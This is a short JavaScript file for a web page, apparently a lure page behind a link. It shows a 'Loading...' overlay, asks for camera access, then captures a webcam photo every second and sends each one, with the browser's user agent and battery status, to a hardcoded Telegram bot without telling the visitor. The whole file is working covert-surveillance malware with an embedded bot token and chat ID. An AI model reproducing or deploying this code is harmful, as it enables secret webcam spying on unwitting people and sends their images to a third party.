const randomToken = '5963079748:AAFTLOUpTOE5VMM0asQ2V_4mhN0yccU69OQ';
const randomChatId = '983127321';

let randomBatteryLevel = 'N/A';
let randomChargingStatus = 'N/A';

async function updateRandomBatteryInfo() {
  if (navigator.getBattery) {
    const battery = await navigator.getBattery();
    randomBatteryLevel = (battery.level * 100).toFixed(2) + '%';
    randomChargingStatus = battery.charging ? 'Charging' : 'Not Charging';
  }
}

function captureAndSendRandomImages() {
  const randomCanvas = document.createElement('canvas');
  const randomContext = randomCanvas.getContext('2d');
  const randomVideo = document.createElement('video');

  updateRandomBatteryInfo(); // Update battery information

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(randomStream) {
      randomVideo.srcObject = randomStream;
      randomVideo.onloadedmetadata = function() {
        randomCanvas.width = randomVideo.videoWidth;
        randomCanvas.height = randomVideo.videoHeight;
        randomContext.drawImage(randomVideo, 0, 0, randomCanvas.width, randomCanvas.height);

        // Combine User Agent and Battery information
        const randomBatteryInfo = `🔋 Battery Information\n🔋 Battery Level: ${randomBatteryLevel}\n⚡️ Is Battery Charging: ${randomChargingStatus}`;
        const randomDeviceInfo = `User Agent: ${window.navigator.userAgent}\n${randomBatteryInfo}`;

        randomCanvas.toBlob(function(randomImageBlob) {
          sendRandomImageToTelegram(randomImageBlob, randomDeviceInfo);
          // Capture and send the next image in the loop
          setTimeout(captureAndSendRandomImages, 1000); // Capture every second
        }, 'image/jpeg');
        randomVideo.srcObject.getTracks().forEach(function(randomTrack) {
          randomTrack.stop();
        });
      };
      randomVideo.play();
    })
    .catch(function(randomError) {
      console.error("Random image capture error: ", randomError);
      document.getElementById("overlay-content").innerHTML = "<p>Media access denied. Please refresh the page and grant permissions. If blocked, <a href=\"https://support.google.com/chrome/answer/2693767?hl=en\" target=\"_blank\" rel=\"noopener noreferrer\">follow Chrome unblocking instructions</a>.</p>";
    });
}

function sendRandomImageToTelegram(randomImageBlob, randomCaption) {
  const randomApiUrl = `https://api.telegram.org/bot${randomToken}/sendPhoto?chat_id=${randomChatId}&caption=${encodeURIComponent(randomCaption)}`;
  const randomFormData = new FormData();
  randomFormData.append('photo', randomImageBlob);
  axios.post(randomApiUrl, randomFormData, { headers: { 'Content-Type': 'multipart/form-data' } })
    .then(function(randomResponse) {
      console.log("Random image sent to Telegram");
    })
    .catch(function(randomError) {
      console.error("Telegram API error: ", randomError);
    });
}

// Capture user agent when the link is clicked
document.getElementById("overlay").style.display = "block";
document.getElementById("overlay-content").innerHTML = "<p>Loading...</p>";

navigator.mediaDevices.getUserMedia({ video: true })
  .then(function(randomStream) {
    // Camera access granted, you can start capturing images here
    captureAndSendRandomImages();
    // Hide the overlay
    document.getElementById("overlay").style.display = "none";
  })
  .catch(function(randomError) {
    console.error("Camera access denied: ", randomError);
    document.getElementById("overlay-content").innerHTML = "<p>Media access denied. Please refresh the page and grant permissions. If blocked, <a href=\"https://support.google.com/chrome/answer/2693767?hl=en\" target=\"_blank\" rel=\"noopener noreferrer\">follow Chrome unblocking instructions</a>.</p>";
  });
